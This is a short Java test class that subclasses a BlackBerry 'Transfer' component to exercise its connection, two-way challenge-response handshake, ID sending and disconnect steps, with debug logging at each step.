package tests.accessor;

import blackberry.transfer.ProtocolException;
import blackberry.transfer.Transfer;
import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;

public class TransferAccessor extends Transfer {
	protected static Debug debug = new Debug("TransferAccessor",
           DebugLevel.VERBOSE);
	public TransferAccessor() {
		super();
	}

	public void ChallengeTest() throws ProtocolException {
		boolean ret = connectDirect() || connectMDS();
		if (!ret) {
			debug.error("cannot connect");
		}

		debug.trace("send challange");
		sendChallenge();
		getResponse();

		debug.trace("get challange");
		getChallenge();
		sendResponse();

		debug.trace("both challange OK");
		// identificazione
		sendIds();

		debug.trace("disconnect");
		disconnect(true);
	}
}
